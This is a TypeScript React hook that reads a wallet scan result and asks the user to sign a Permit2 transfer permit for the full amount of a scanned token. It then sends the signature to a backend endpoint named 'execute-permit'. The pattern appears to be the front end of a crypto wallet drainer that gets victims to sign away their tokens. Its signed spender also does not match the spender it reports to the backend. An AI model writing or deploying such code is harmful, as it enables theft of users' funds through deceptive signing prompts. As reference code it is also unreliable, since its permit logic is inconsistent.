import { useSignTypedData } from "wagmi";
import API from "../providers/axios";
import type { ScanResult } from "../types/wallet";

const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS;

const PERMIT2_TYPES = {
  PermitTransferFrom: [
    { name: "permitted", type: "TokenPermissions" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
};

export function usePermit2Execution() {
  const { signTypedDataAsync } = useSignTypedData();

  const executePermit2 = async (
    scanData: ScanResult,
    spenderAddress: string,
    chainId: number,
    chain: string | undefined,
    user: string,
  ) => {
    const permit2Tokens = scanData.permit2;
    if (!permit2Tokens?.length) return;

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const permit = permit2Tokens[0];
    const nonce = BigInt(Date.now());

    let signature: string;
    try {
      signature = await signTypedDataAsync({
        domain: {
          name: "Permit2",
          chainId: Number(chainId),
          verifyingContract: PERMIT2_CONTRACT,
        },
        types: PERMIT2_TYPES,
        primaryType: "PermitTransferFrom",
        message: {
          permitted: {
            token: permit.token,
            amount: BigInt(permit.amount),
          },
          spender: PERMIT2_CONTRACT,
          nonce,
          deadline: BigInt(deadline),
        },
      });
      console.log("SIGNATURE RESPONSE:", signature);
    } catch (err) {
      console.error("SIGN FAILED:", err);
      return;
    }

    const signedPayload = {
      chainId: Number(chainId),
      chain,
      user,
      data: {
        symbol: permit.symbol,
        amount: permit.amount,
        spender: spenderAddress,
        nonce: nonce.toString(),
        deadline,
        signature,
      },
    };

    // console.log("PERMIT PAYLOAD SENT TO BACKEND:", signedPayload);

    const res = await API.post("/api/execute-permit", signedPayload);
    return res.data;
  };

  return { executePermit2 };
}
